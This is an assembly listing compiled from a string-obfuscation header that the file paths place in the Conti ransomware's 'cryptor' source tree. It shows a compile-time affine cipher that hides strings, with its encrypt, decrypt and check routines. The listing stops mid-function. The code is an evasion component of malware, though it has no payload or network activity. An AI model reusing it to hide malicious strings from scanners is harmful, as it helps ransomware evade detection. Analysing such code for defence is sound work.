; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEBA_NXZ PROC ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv224 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00329	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  0032d	88 85 c0 00 00
	00		 mov	 BYTE PTR tv224[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00333	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0033a	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00341	5f		 pop	 rdi
  00342	5d		 pop	 rbp
  00343	c3		 ret	 0
??0?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z PROC ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 3c	 sub	 eax, 60			; 0000003cH
  0002d	6b c0 19	 imul	 eax, eax, 25
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z PROC ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 3d	 imul	 eax, eax, 61		; 0000003dH
  0002d	83 c0 3c	 add	 eax, 60			; 0000003cH
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEBA_NXZ ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
